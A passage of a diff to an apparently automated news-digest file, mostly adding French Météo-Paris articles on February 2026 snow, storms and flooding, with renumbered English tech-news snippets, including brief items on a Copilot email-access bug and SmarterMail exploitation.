février, une nouvelle perturbation océanique traverse l’air froid et apporte de nouvelles chutes de neige du Massif central vers l’Île-de-France et le nord du pays, prolongeant cet épisode hivernal marquant. La neige des 6 et 7 février 2018 à Paris où il tombe 12 cm - meteo-paris.com et Alexandre Slowik Une seconde vague de froid, intense, à la fin du mois Du lundi 26 février au jeudi 1er mars 2018, un puissant flux d’air glacial venu de l’est, surnommé le “Moscou-Paris”, envahit une grande partie de l’Europe continentale. Il provoque en France une vague de froid courte mais intense, d’abord sèche, puis accompagnée de neige. Un premier épisode neigeux concerne l’extrême Sud-Est entre le 26 et le 27 février, lié à une instabilité débordant d’Italie. La neige tombe jusqu’en plaine et même sur le littoral entre le Var, les Alpes-Maritimes et l’est des Bouches-du-Rhône. Elle atteint Nice, Menton et surtout Ajaccio, qui se réveille le 27 février sous 15 cm de neige. La nuit des 27-28 février est glaciale sur l’ensemble du pays, avec des températures descendant sous –10°C sur près de la moitié de la France, y compris en Île-de-France, dans le Nord et le Centre. On relève notamment –14,3°C à Luxeuil-les-Bains, –13,4°C à Clermont-Ferrand et Nancy, –11°C à Creil, –10,3°C à Orléans et –10°C à Lyon-Bron. La vague de froid se termine entre le mercredi 28 février au matin et le jeudi 1er mars dans l’après-midi par un épisode neigeux plus généralisé, progressant du Sud-Ouest vers le Nord et le Nord-Ouest. Le Mardi 27 février 2018 au matin, Ajaccio, s'est réveillée sous 15 cm, la plus importante épaisseur de neige dans la ville depuis les 25 cm du 10 février 1986 - source twitter et meteo-paris.com A lire également : &gt;&gt;&gt; La neige à Paris et en Ile de France : toute une histoire &gt;&gt;&gt; Vraie vague de froid venue de Sibérie à partir de lundi &gt;&gt;&gt; Retour de la neige annonçant la fin de la vague de froid &gt;&gt;&gt; Chronique météo du début de l'année 2018 &gt;&gt;&gt; La neige clôt la vague de froid et précède le redoux Auteur : Guillaume Séchet
+
+</div>
+
+<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
+
+### 11. `FR` [La neige revient jusqu'en Ile-de-France, ce week-end !](data/articles/a4a4a756dfd4ed5bf2782742c58c0633.html)
+**Source:** Météo-Paris | **Keyword:** `Local`
+Le flux basculera temporairement au nord ce week-end avec un refroidissement permettant le retour de la neige jusqu'en plaine. Notre article fait le point sur les régions qui devraient voir tomber les flocons samedi et dimanche. Bref refroidissement ce week-end Dans le sillon de la tempête Nils, un autre minimum dépressionnaire se creusera vers les Baléares durant la journée du vendredi 13 février 2026, se décalant ensuite vers la Corse puis l'Italie durant ce week-end des 14 et 15 février. À l'arrière de cette dépression, la France basculera en flux de secteur nord dès la journée du samedi 14 février. L'air froid actuellement présent sur la Mer du Nord va donc s'engouffrer sur l'hexagone durant la Saint-Valentin. La douceur cèdera sa place à une ambiance plus hivernale. Température de la masse d'air à 850 hPa (vers 1500m) le dimanche 15 février 2026 à minuit - wxcharts.com Malgré tout, il ne s'agira absolument pas d'une offensive hivernale majeure - et encore moins durable. En effet, une nouvelle dépression gagnera le nord-ouest des Îles Britanniques dès le dimanche 15 février 2026 avec une nouvelle accélération du flux d'ouest sur le proche-Atlantique, gagnant déjà l'ouest de la France avec un air océanique plus doux dès la journée de dimanche. Où va-t-il neiger samedi et dimanche ? La bascule en flux de nord causera le décalage d'un front vers l'est de la France et les Pyrénées le samedi 14 février 2026. En plaine, la masse d'air ne sera pas encore assez froide pour que la neige vienne blanchir les sols. Quelques flocons pourront tomber jusqu'aux altitudes les plus basses en fin de front dans l'est, mais sans conséquence. En revanche, il tombera plusieurs centimètres dès la basse montagne. On peut s'attendre à des sols blanchis dès 400m sur les Vosges, 600-700 mètres pour le Jura, le Massif Central et les Alpes avec souvent 5 cm dans les stations. Il neigera plus abondamment dans les Pyrénées où on attend 15 à 25 cm dans les stations et des sols blanchis dès 800 mètres. Risque de neige pour le samedi 14 février 2026 - Météo Villes La journée la plus intéressante à suivre sera celle du dimanche 15 février 2026. Une perturbation arrivera par les régions océaniques avec pluie et douceur. En arrivant sur l'air froid, elle pourrait être précédée de chutes de neige en seconde partie de nuit et matinée du Limousin à la Normandie et jusqu'au bassin parisien. Selon les dernières modélisations, une petite couche est possible avec 1 à 3 cm (tenue plus aisée sur les hauteurs). Le front perdrait en activité en gagnant la Champagne et la Bourgogne mais pourrait se réactiver le soir sur les régions frontalières du nord-est, où la neige pourrait aussi blanchir temporairement les sols, avant que la pluie ne prenne le relais. Risque de neige pour le dimanche 15 février 2026 - Météo Villes Pour l'heure, il existe encore des incertitudes sur les régions qui seront concernées par la neige et sur l'activité de la perturbation. Dans tous les cas, les flocons seront éphémères et la pluie prendra rapidement le relais avec le retour de la douceur dès le lundi 16 février 2026. À lire également : &gt;&gt;&gt; Vigilance rouge pour la tempête Nils avec des vents à plus de 150 km/h &gt;&gt;&gt; En pleine guerre, l'Ukraine souffre d'un hiver très froid &gt;&gt;&gt; Le retour de la neige en plaine en fin de semaine ? &gt;&gt;&gt; Les tempêtes mémorables de février 1990 &gt;&gt;&gt; L'épisode de pluies verglaçantes de la mi-février 1978 &gt;&gt;&gt; Notre bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Notre compte Twitter très suivi et référence dans tous les médias ! Auteur : Alexandre Slowik
+
+</div>
+
+<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
+
+### 12. `FR` [Le retour de la neige en plaine en fin de semaine ?](data/articles/203038773fbbd3b8c106341391cf058c.html)
+**Source:** Météo-Paris | **Keyword:** `Local`
+Image d’archive meteo-paris.com de la neige du 7 février 2018 Un retour temporaire du froid en fin de semaine Si le froid est récurrent et parfois marqué depuis maintenant plusieurs semaines sur le nord et l'est de l'Europe, la France est au contraire soumise à une influence océanique très perturbée mais globalement douce depuis les environs de la mi-janvier. Ce type de temps très humide mais plutôt doux persiste cette semaine, toujours lié à cette influence océanique perturbée avec un défilé de perturbations sous un air globalement doux pour la saison venu de l'océan Atlantique. Toutefois, la situation va évoluer en fin de semaine. En effet, une vaste zone dépressionnaire située entre les îles britanniques et le nord de la France va peu à peu glisser vers l'Italie, ce qui permettra au flux de basculer au nord/nord-ouest sur notre pays avec l'arrivée d'air polaire maritime. Animation des températures à 850 hPa sur l’Europe du 9 au 16 février 2026 – Modèle GFS via meteociel Ce retour du froid devrait toutefois rester très temporaire. Comme visible sur l'animation précédente, le flux océanique reprendrait le dessus dès le début de semaine prochaine avec des températures repartant rapidement à la hausse et le retour de pluies parfois abondantes sur la majorité du pays. Un risque de neige jusqu'en plaine ? Si le retour du froid s'annonce temporaire, celui-ci ne devrait pas passer inaperçu pour autant. En effet, celui-ci s'accompagnera d'un risque de neige jusqu'en plaine sur notre pays durant le week-end. À l'arrière de la zone dépressionnaire, alors que l'air froid s'engouffrera rapidement sur la France entre vendredi et samedi, le temps devrait rester instable sur une partie du pays et la neige pourrait s'inviter jusqu'en plaine à l'arrière du front principal en journée de samedi, notamment sur l'est et le nord du pays comme souvent dans ce type de situation. Risque de neige jusqu'en plaine en France pour le samedi 14 février 2026 – Modèle ECMWF via meteociel Bien entendu, la situation pourra encore évoluer d'ici là et ceci ne représente qu'un scénario parmi tant d'autres. Néanmoins, on note un certain consensus des principaux modèles de prévisions ce lundi pour le retour de possible de la neige jusqu'en plaine sur notre pays. Ce risque de neige pourrait de plus persister tout le week-end. En effet, on surveillera aussi un risque d'épisode de neige de redoux à la toute fin du week-end avec l'arrivée d'un nouveau front par l'océan, accompagné d'un redoux en altitude mais arrivant sur l'air froid encore présent sur le nord et l'est de la France, ce qui pourrait signifier un risque de neige de redoux/pluies verglaçantes sur certaines régions. Risque de neige de redoux en France pour le dimanche 15 février 2026 – Modèle ECMWF via meteociel La situation conviendra d'être confirmée d'ici le week-end, celle-ci pouvant encore bien évoluer à une telle échéance en fonction du placement exact des centres d'action dans les prochains jours. En effet, le moindre décalage pourrait annihiler ce risque de neige en plaine sur notre pays. Toutefois, à la vue des modélisations en ce début de semaine, le nord et l'est de la France seraient les plus exposés à ce retour temporaire de l'hiver sur notre pays. Risque de neige en plaine en fin de semaine sur la France – Météo-Villes À lire également : &gt;&gt;&gt; Les tempêtes mémorables de février 1990 &gt;&gt;&gt; Menace de tempête sur la moitié sud pour jeudi &gt;&gt;&gt; L'épisode de pluies verglaçantes de la mi-février 1978 &gt;&gt;&gt; Notre bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Notre compte Twitter très suivi et référence dans tous les médias ! Auteur : Tristan Bergen
+
+</div>
+
+<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
+
+### 13. `FR` [Tempête Pedro : la goutte d'eau de trop !](data/articles/ee486785b0f65bd0ea3aa1c8e7f133fe.html)
+**Source:** Météo-Paris | **Keyword:** `Local`
+Une dépression très creuse va apporter des vents forts et de nouvelles pluies abondantes sur la France en milieu de semaine Vents forts et nouvelles pluies intenses sont attendues au passage d'une dépression bien creuse sur la France entre mercredi 18 et jeudi 19 février 2026. Le niveau de certains cours d'eau étant déjà très élevé, cette nouvelle tempête laisse craindre le pire. Un temps restant agité dans les prochains jours L’influence océanique perturbée persiste en cette mi-février. Sous l’effet d’un courant jet survolant la France, de nouvelles perturbations sont attendues dans les prochains jours, avec plusieurs zones dépressionnaires circulant sur l’ouest de l’Europe jusqu’au week-end. La situation nécessitera une vigilance particulière entre mercredi et jeudi. Une dépression secondaire devrait se former rapidement en marge d’une zone dépressionnaire au large de l’Irlande, se dirigeant vers la Bretagne puis vers l’Italie jeudi. Cette dépression assez creuse devrait entraîner un temps très agité sur le pays, marqué par des vents forts et de fortes précipitations. Vents parfois forts, en limite du niveau de tempête Alors qu’un creusement dépressionnaire notable se dirige vers notre pays, les vents vont se renforcer sur une partie ouest et sud de la France entre mercredi et jeudi. Les vents les plus forts devraient suivre une trajectoire similaire à celle de la tempête Nils, mais heureusement, ils ne devraient pas atteindre la même intensité. C'est donc notamment entre la façade Atlantique, le sud-ouest et les abords de la Méditerranée que les rafales les plus fortes sont attendues entre mercredi soir et jeudi avec parfois plus de 90-100 voire 140 km/h sur les secteurs les plus exposés. Ceci restera néanmoins à confirmer d'ici là. Rafales maximales de vent prévues d'ici vendredi matin, selon le modèle météo européen - via Meteociel Des pluies abondantes et une aggravation des inondations Outre les vents parfois forts, il conviendra également de surveiller le risque de nouvelles fortes précipitations au passage de cette dépression sur notre pays. En effet, entre les pluies parfois abondantes de ce lundi, surtout sur le sud et l'est de la France et le passage de la dépression PEDRO, les cumuls de précipitations s'annoncent de nouveau très importants entre mardi midi et jeudi soir, y compris dans le bassin de la Seine et de la Loire. Cumuls de précipitations attendus entre mardi matin et jeudi soir – Modèle européen via Meteociel Or, ces précipitations toucheront des secteurs déjà particulièrement durement touchées ces dernières semaines, secteurs où les inondations sont déjà nombreuses et parfois importantes depuis la semaine dernière. C'est notamment le cas d'une large partie ouest de la France où la quasi-totalité des cours d'eau sont en crue et où la Garonne, la Loire Saumuroise et les basses vallées angevines subissent une crue historique. Carte Vigicrues du 18 février 2026 à 09h56 Les précipitations de ce début de semaine, suivies du passage de la dépression entre mercredi et jeudi, risquent d’aggraver considérablement la situation actuelle dans ce secteur, laissant craindre des crues généralisées et potentiellement importantes. Un coefficient de marée et une forte houle aggravant la situation Et comme si cela ne suffisait pas, ces intempéries surviennent au plus mauvais moment. Bien qu’il ne s’agisse pas de marées d’équinoxe, les coefficients restent particulièrement élevés (96 et 97), et la houle générée par cette dépression profonde pourrait dépasser les 6 mètres de hauteur sur la façade Atlantique jeudi matin. Cette situation risque de freiner l’écoulement des cours d’eau et, par conséquent, d’aggraver encore davantage les inondations. À lire également : &gt;&gt;&gt; 1 mort et de gros dégâts : la tempête Nils a frappé fort ! &gt;&gt;&gt; En pleine guerre, l'Ukraine souffre d'un hiver très froid &gt;&gt;&gt; Vers les 5 m de neige en haut de certaines stations de ski ? &gt;&gt;&gt; Notre bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Notre compte Twitter très suivi et référence dans tous les médias ! Auteur : Tristan Bergen
+
+</div>
+
+<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
+
+### 14. `FR` [En pleine guerre, l'Ukraine souffre d'un hiver très froid](data/articles/cb0e8862d419270f45c798d281322595.html)
+**Source:** Météo-Paris | **Keyword:** `Local`
+Alors que la guerre se poursuit, l'Ukraine fait face à un hiver très rigoureux. Le thermomètre chute jusqu'à -20°C à Kiev où les coupures d'électricité répétée empêchent les habitants de se chauffer et mettent la population à rude épreuve. Image améliorée par IA. L'Ukraine plongée dans un froid mordant depuis Noël Alors que les trois premières semaines du mois de décembre 2025 avaient été douces et clémentes, le froid est arrivé brutalement sur l'Ukraine lors des fêtes de Noël. Depuis, il n'y a eu aucun redoux. À Kiev, la température la plus élevée mesurée entre Noël et ce 10 février 2026 fut de +1°C. Au mois de janvier 2026, la capitale ukrainienne a enregistré une température moyenne de -10°C le matin et -5°C l'après-midi. 18 nuits ont franchi le seuil des -10°C, alors que la normale est de -5°C. Avec un déficit de -4°C sur 31 jours, Kiev a connu son mois de janvier le plus froid depuis 2010 ! Températures minimales et maximales mesurées à Kiev (Ukraine) au mois de janvier 2026 - infoclimat.fr La situation ne s'arrange pas en ce mois de février, bien au contraire ! Les 10 premiers jours du mois ont été particulièrement froids à Kiev avec une moyenne de -14°C durant les nuits et de -7°C les après-midi ! 5 des 10 premières nuits du mois ont enregistré des températures inférieures à -15°C ! D'ailleurs, cette nuit du 10 février 2026 fut bien souvent la plus froide de l'hiver. Kiev a franchi la barre des -20°C pour la première fois avec une minimale de -20,2°C ! Dans le nord du pays, on a mesuré jusqu'à -28,2°C à Tchernihiv, ville peuplée de plus de 280.000 habitants. Températures minimales mesurées en Ukraine ce mardi 10 février 2026 - carte ogimet La guerre rend le froid beaucoup plus difficile Pour les soldats engagés sur le front, ce froid rend les conditions de vie particulièrement rudes. Toutefois, l'ensemble de la population est affectée. Comme la Russie attaque les infrastructures énergétiques, les coupures d'électricité sont très nombreuses. Actuellement, la capitale Kiev ne profite que d'environ deux heures d'électricité par jour. Autant dire que le chauffage ne peut pas être utilisé efficacement et que le froid pénètre dans les habitations, plongées dans le noir durant de nombreuses heures la nuit. Kiev (Ukraine) privée d'électricité au cours d'un hiver particulièrement froid - photo Sergey Dolzhenko La Russie tire profit de cet hiver rude. Ces dernières semaines, toutes les infrastructures énergétiques d'Ukraine ont été attaquées afin de mettre à mal l'accès à l'électricité dans le pays. L'objectif étant d'épuiser la population en la surexposant aux températures excessivement basses. En ce mois de février 2026, les autorités indiquent que les prochains jours resteront très difficiles en raison du déficit électrique très important, lié à l'arrêt de nombreuses centrales ayant été endommagées. Les rues de Kiev (Ukraine) sous la neige durant le mois de janvier 2026 - photo Sergej Sumlenny À lire également : &gt;&gt;&gt; Le retour de la neige en plaine en fin de semaine ? &gt;&gt;&gt; Les tempêtes mémorables de février 1990 &gt;&gt;&gt; Menace de tempête sur la moitié sud pour jeudi &gt;&gt;&gt; L'épisode de pluies verglaçantes de la mi-février 1978 &gt;&gt;&gt; Notre bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Notre compte Twitter très suivi et référence dans tous les médias ! Auteur : Alexandre Slowik
+
+</div>
+
+<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
+
+### 15. `FR` [Une autre offensive hivernale possible en milieu de semaine](data/articles/731c6ab78938d48ae50847000206951a.html)
+**Source:** Météo-Paris | **Keyword:** `Local`
+La neige fera son retour en Île-de-France ce dimanche 15 février, tout comme sur d'autres régions du nord et du nord-est de la France - Image d'illustration (vue depuis notre caméra meteo-paris.com) Des chutes de neige relativement éphémères auront lieu ce dimanche jusqu'en plaine entre les Hauts-de-France, tout le Bassin parisien et le nord-est du pays. D'autres épisodes pourraient avoir lieu la semaine prochaine. Retour très bref de la neige en plaine L'invasion polaire continentale qui a eu lieu samedi, fut de courte durée, rapidement remplacée par une poussée océanique plus douce. Si l’air froid persiste sur une grande partie de la France ce dimanche, un nouveau front pluvieux traverse rapidement le pays par l’Ouest. Ce front est accompagné d’un net redoux en altitude, mais la pluie est temporairement précédée de neige pendant quelques heures, là où la couche d’air froid sera suffisamment épaisse. Dimanche matin, la Normandie et l’Île-de-France ont connu des chutes de neige moins importantes que prévues, la perturbation s’étant scindée en deux. La neige a principalement touché un axe s’étendant du Limousin aux Pays de la Loire et au Centre, avant de se réactiver sur les Hauts-de-France, la Champagne-Ardenne et la Lorraine dans l’après-midi et la soirée. Évolution prévue des zones enneigées entre dimanche 8h et lundi 3h – (réactualisation de dimanche 6h - Modèle CEP via meteociel) Quelques centimètres, notamment sur les plateaux Ainsi, les cumul de neige ont été revus à la baisse de la Normandie à l'Île-de-France, mais pas forcément ailleurs. Paris n'a par exemple pas du tout été blanchie. Dimanche en fin de journée, les épaisseurs de neige pourraient dépasser 5 cm entre le nord du département de l'Aisne, ainsi que les Ardennes et le nord de la Lorraine. Épaisseurs de neige maximales prévue pour le dimanche 15 février 2026 (réactualisation de dimanche 6h) – Météo-Villes Une semaine à risque sur les régions du Nord et du nord-est Après le redoux de dimanche après-midi, l’air froid reprendra rapidement le dessus sur la moitié nord dès le début de la semaine. Une dépression, déviée vers le sud par l’air froid persistant au nord, devrait s’échouer sur la France entre mercredi soir et jeudi. Les précipitations, sous cet air froid, pourraient se transformer en neige. Il est cependant encore trop tôt pour déterminer précisément les régions concernées. Des chutes de neige significatives sont possibles, avec un risque accru entre la Normandie, l’Île-de-France et toutes les régions situées au nord de la Seine. Explication du risque de neige pour le milieu de la semaine – Météo-Villes À lire également : &gt;&gt;&gt; 1 mort et de gros dégâts : la tempête Nils a frappé fort ! &gt;&gt;&gt; La neige revient jusqu'en Ile-de-France, ce week-end ! &gt;&gt;&gt; En pleine guerre, l'Ukraine souffre d'un hiver très froid &gt;&gt;&gt; Le retour de la neige en plaine en fin de semaine ? &gt;&gt;&gt; Notre bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Notre compte Twitter très suivi et référence dans tous les médias ! Auteur : Guillaume Séchet
+
+</div>
+
+<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
+
+### 16. `FR` [Nombreuses crues et encore beaucoup de pluie à venir...](data/articles/105e462bb588bf69cb5be43e339ed0be.html)
+**Source:** Météo-Paris | **Keyword:** `Local`
+Crue majeure de la Garonne à Saint-Léger (47) le jeudi 12 février 2026 - photo Geoffrey Bigey &amp; carte de vigilance des cours d'eau en France au vendredi 13 février 2026 au soir Les crues et les inondations concernent déjà de nombreuses régions. Tous les regards sont tournés vers les nouvelles pluies copieuses attendues ces prochains jours, faisant redouter des crues encore plus importantes. Des dizaines de cours d'eau en crue ! La France vit son début d'année le plus pluvieux depuis 10 ans ! Sur les six premières semaines de l'année, le cumul moyen à échelle nationale atteint 152 mm, soit 64 mm de plus que la normale ! Il faut remonter au début de l'année 2016 pour retrouver des cumuls de précipitations plus importants. Ainsi, la situation s'est fortement dégradée au cours des derniers jours, marqués par des pluies très abondantes. Plusieurs dizaines de cours d'eau du sud et de l'ouest de la France sont actuellement en vigilance orange crue et la Garonne marmandaise et girondine est même en vigilance ROUGE ! C'est donc la Garonne qui subit la crue la plus exceptionnelle, sur deux tronçons situés dans les départements du Lot-et-Garonne (Garonne marmandaise) et de la Gironde (Garonne girondine), où l'alerte rouge est toujours en vigueur. Jeudi 12 février 2026, le niveau de la Garonne a franchi la barre des 9 mètres à Tonneins, où a été prise la photo ci-dessous. Le fleuve sort très loin en dehors de son lit et ses eaux recouvrent de vastes étendues de terre. Les pompiers ont précédé à des évacuations durant la journée de jeudi. Crue majeure de la Garonne à Tonneins (47) le jeudi 12 février 2026 - photo Luis Madeiras Le pire encore à venir ? La situation est particulièrement tendue puisque les sols sont actuellement saturés en eau sur une grande partie du territoire français. La carte ci-dessous représente l'indice d'humidité des sols en surface. Lorsque la couleur vire au bleu foncé, on arrive à la saturation. Si les couleurs virent au mauve, la saturation est totale, ce qui signifie que les sols ne sont plus en mesure d'absorber de nouvelles précipitations. C'est particulièrement le cas dans le sud et l'ouest de la France. Indice d'humidité des sols en surface au 10 février 2026 - Météo France Le problème étant que cette séquence fortement perturbée n'est pas terminée, bien au contraire. Dès ce vendredi 13 février 2026, de nouvelles pluies concerneront la France. On attend de nouvelles perturbations actives, notamment les dimanche 15 et lundi 16 février. Ce sont plusieurs dizaines de millimètres de pluie qui tomberont encore sur une grande partie de l'hexagone d'ici au début de la semaine prochaine avec des cumuls dépassant fréquemment les 50 mm dans le sud-ouest et pouvant atteindre les 100 mm sur les reliefs. Autant dire qu'il faut s'attendre à de nouvelles crues majeures... Cumuls de pluie prévus du vendredi 13 au lundi 16 février 2026 - meteologix.com À lire également : &gt;&gt;&gt; 1 mort et de gros dégâts : la tempête Nils a frappé fort ! &gt;&gt;&gt; La neige revient jusqu'en Ile-de-France, ce week-end ! &gt;&gt;&gt; En pleine guerre, l'Ukraine souffre d'un hiver très froid &gt;&gt;&gt; Le retour de la neige en plaine en fin de semaine ? &gt;&gt;&gt; Les tempêtes mémorables de février 1990 &gt;&gt;&gt; L'épisode de pluies verglaçantes de la mi-février 1978 &gt;&gt;&gt; Notre bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Notre compte Twitter très suivi et référence dans tous les médias ! Auteur : Alexandre Slowik
+
+</div>
+
+<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
+
+### 17. `FR` [Menace de tempête sur la moitié sud pour jeudi](data/articles/cdf91c9564500e4622405ddee5ea20ad.html)
 **Source:** Météo-Paris | **Keyword:** `Local`
 Après un week-end relativement calme, la semaine s’annonce particulièrement agitée avec le retour d’un puissant courant océanique sur toute l’Europe occidentale. Un puissant courant d'altitude Plusieurs perturbations pluvieuses et venteuses traverseront la France, mais c’est surtout celle de la nuit de mercredi à jeudi et de la journée de jeudi qui retient l’attention. Compte tenu de l’évolution dynamique de la situation, ces prévisions peuvent encore changer sensiblement. Cependant, depuis quelques jours, de nombreux scénarios prévoient une alerte pour la moitié sud de la France, car le puissant courant d’altitude (appelé courant jet) devrait circuler très au sud. Une dépression devrait se former rapidement dans la journée de mercredi sur le proche Atlantique et sera propulsée à grande vitesse par ce courant jet vers la Manche puis l’Allemagne. Position du courant jet prévue jeudi 12 février à 4h du matin - source fond de carte : Meteociel, retravaillée par Meteo-villes Une dépression très creuse, circulant rapidement Étant donné que ce courant d’altitude sera particulièrement puissant sur le nord de l’Espagne, les vents les plus forts ne devraient pas se produire sur la moitié nord de la France, mais plutôt sur la moitié sud. Si ce courant circule plus au nord, davantage de régions seront concernées par ces vents tempétueux. Évolution de la dépression entre mercredi soir et vendredi matin selon le modèle METEO européen - source fond de carte : Meteociel Une tempête entre la face atlantique et la Méditerranée Ainsi, selon les prévisions de dimanche soir, les vents les plus forts devraient souffler entre le golfe de Gascogne et la Méditerranée, au sud d’une ligne reliant La Rochelle, Clermont-Ferrand, le sud des Alpes et la Corse. Le littoral aquitain et une grande partie de l’Occitanie, notamment les plaines du Roussillon et le relief du sud du Massif central, seraient particulièrement exposés à de violentes rafales, pouvant localement dépasser les 150 km/h. Le sud des Alpes et la Corse seront également très concernés. Rafales vent maximales prévues par le modèle météo européen - source fond de carte : Meteociel Le modèle METEO allemand est légèrement plus pessimiste que l’européen. Nous n’avons pas présenté ici le modèle METEO américain, qui partage le même niveau de pessimisme. Bien entendu, nous ajusterons nos prévisions au fil des jours jusqu’à l’échéance. Rafales vent maximales prévues par le modèle météo allemand - source fond de carte : Meteociel A lire également : &gt;&gt;&gt; Alerte aux tempêtes et aux inondations pour la semaine prochaine ! &gt;&gt;&gt; Les tempêtes mémorables de février 1990 &gt;&gt;&gt; Notre bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Notre compte Twitter très suivi et référence dans tous les médias ! Auteur : Guillaume Séchet
+
+</div>
+
+<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
+
+### 18. `FR` [Vers le retour du beau temps (et la fin des inondations) ??](data/articles/42c33b147843878761bcaee76543c20f.html)
+**Source:** Météo-Paris | **Keyword:** `Local`
+Bientôt le retour d'un temps plus calme ? Depuis plusieurs semaines, la France subit l’influence d’un courant océanique humide et perturbé, engendrant des précipitations fréquentes, des vents parfois tempétueux et un temps durablement instable. Jusqu'à présent, il était devenu rare d’enchaîner plusieurs jours de temps anticyclonique sur la France. Les hautes pressions ne parvenaient jamais à s’installer durablement, et le courant océanique reprenait rapidement le dessus. Cependant, une amélioration semble se profiler. Bien que le temps reste perturbé dans les prochains jours, les prévisions météorologiques annoncent le retour de conditions anticycloniques pour la fin de semaine sur la France et une partie de l’ouest de l’Europe. En effet, le courant-jet devrait circuler plus au nord de l’Europe en fin de semaine, permettant aux hautes pressions (anticyclone des Açores) de s’étendre à nouveau vers l’ouest du continent, et donc vers la France pour le week-end. Cela devrait assurer le retour d’un temps plus sec et calme durant au moins 4 jours. Prévision de l'évolution des anticyclones et dépressions sur l'Europe du jeudi 16 au lundi 23 février 2026 – Modèle européen via Meteociel Un temps calme s'imposant enfin plus durablement ? Il est difficile de prédire avec certitude. Si les modélisations de ces derniers jours suggéraient une tendance anticyclonique plus durable sur notre pays, les dernières simulations remettent en question cette hypothèse. Le courant océanique pourrait reprendre de la vigueur dès mercredi 25 février à la fin du mois. Prévision de l'évolution des anticyclones et dépressions sur l'Europe du lundi 23 février au lundi 2 mars 2026 – Modèle européen Cependant, certains scénarios envisagent une inversion de la situation et l'arrêt de ce courant perturbé océanique au début du mois de mars avec la formation d'un vaste anticyclone entre les Açores et la partie nord de l'Europe. Ceci annoncerait potentiellement le début d'une nouvelle accalmie beaucoup plus prolongée sur la France, mais il faudra attendre que la dépression qui viendra peut-être s'isoler sur le sud du pays disparaisse. Les tendances pour le mois de mars indiquent même un temps durablement sec. Bien que nous restions prudents, une telle évolution serait un contraste saisissant avec les conditions météorologiques récentes et une excellente nouvelle pour la gestion des crues et inondations. Si la majorité des modèles convergent vers cette prévision, il est essentiel de suivre l’évolution des prévisions dans les prochains jours, car les tendances peuvent changer à une échéance aussi lointaine. Anomalies de précipitations prévues pour le mois de mars 2026 - CFS À lire également : &gt;&gt;&gt; 1 mort et de gros dégâts : la tempête Nils a frappé fort ! &gt;&gt;&gt; En pleine guerre, l'Ukraine souffre d'un hiver très froid &gt;&gt;&gt; Vers les 5 m de neige en haut de certaines stations de ski ? &gt;&gt;&gt; Notre bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Notre compte Twitter très suivi et référence dans tous les médias ! Auteur : Tristan Bergen et Guillaume Séchet
 
 </div>
 
@@ -3811,7 +3829,7 @@ Install Windows 11 for Arm on the Raspberry Pi 5 using the simplest installation
 
 ### 41. `EN` [How to use an RFID reader with a Raspberry Pi Pico](data/articles/6fc4ae025c982c0ce4bf495c7e4d8a29.html)
 **Source:** Toms Hardware Raspberry Pi | **Keyword:** `RaspberryPi`
-(Image credit: Tom's Hardware) RFID cards and tags are everywhere! We use them in buildings for access control. Printers and photocopiers can use them to identify staff members. Livestock tagging and pet identification tags all use a form of RFID. The tech to read an RFID device is cheap, for around $5 you can get the reader, and for $4, a Raspberry Pi Pico can read the IDs from the cards / tags.In this how to, we will learn how to read RFID tags and cards using an MFRC522 reader and a Raspberry Pi Pico, the goal will be to create a fictional RFID access control system that will allow users into a building, or alert security to remove them. Before we can do that, we need to identify the ID of our cards / tags. The first section of this how to will do just that, and then we will insert some code to control two LEDs to simulate the locking mechanism.For this how to you will needRaspberry Pi Pico running MicroPythonMFRC522 RFID readerLarge breadboard11 x Male to male jumper wiresGreen LEDRed LED2 x 100 Ohm resistors (Brown - Black - Brown - Gold)Building the Hardware (Image credit: Tom's Hardware)The hardware build is split into two sections. First is the wiring for the MFRC522 RFID reader. The reader uses SPI to communicate with the Raspberry Pi Pico and it requires seven pins to do so. Two are for power (3.3V and GND) and the rest are for SPI.Swipe to scroll hori
+ACCESS GRANTED
 
 </div>
 
@@ -4253,7 +4271,15 @@ Former Bing boss says Microsoft cut Windows 11’s vertical taskbar for its “s
 
 <div class="article-item" data-lang="en" data-category="windows" data-source="Neowin">
 
-### 20. `EN` [Microsoft testing Postgame Recaps feature on PC to highlight your gaming sessions](data/articles/9fce0bc1cec7c8059a11b0416fd08536.html)
+### 20. `EN` [Microsoft is uploading your confidential emails to Copilot for summarization](data/articles/e4cb18d53bbbe771272ba325612b3918.html)
+**Source:** Neowin | **Keyword:** `Tech`
+Copilot caught peeking? A bug reportedly let the AI read confidential enterprise emails it was never meant to see. A complete fix is still not available. ...
+
+</div>
+
+<div class="article-item" data-lang="en" data-category="windows" data-source="Neowin">
+
+### 21. `EN` [Microsoft testing Postgame Recaps feature on PC to highlight your gaming sessions](data/articles/9fce0bc1cec7c8059a11b0416fd08536.html)
 **Source:** Neowin | **Keyword:** `Tech`
 Microsoft wants to give you highlights from your PC gaming sessions using the new Postgame Recaps feature. ...
 
@@ -4261,7 +4287,7 @@ Microsoft wants to give you highlights from your PC gaming sessions using the ne
 
 <div class="article-item" data-lang="en" data-category="windows" data-source="BleepingComputer Windows">
 
-### 21. `EN` [Telegram channels expose rapid weaponization of SmarterMail flaws](data/articles/4ce6b19bb34a472c6b3c402f09a2e49d.html)
+### 22. `EN` [Telegram channels expose rapid weaponization of SmarterMail flaws](data/articles/4ce6b19bb34a472c6b3c402f09a2e49d.html)
 **Source:** BleepingComputer Windows | **Keyword:** `Security`
 Underground Telegram channels shared SmarterMail exploit PoCs and stolen admin credentials within days of disclosure. Flare explains how monitoring these communities reveals rapid weaponization of CVE-2026-24423 and CVE-2026-23760 tied to ransomware activity. [...]
 
@@ -4269,7 +4295,7 @@ Underground Telegram channels shared SmarterMail exploit PoCs and stolen admin c
 
 <div class="article-item" data-lang="en" data-category="windows" data-source="Neowin">
 
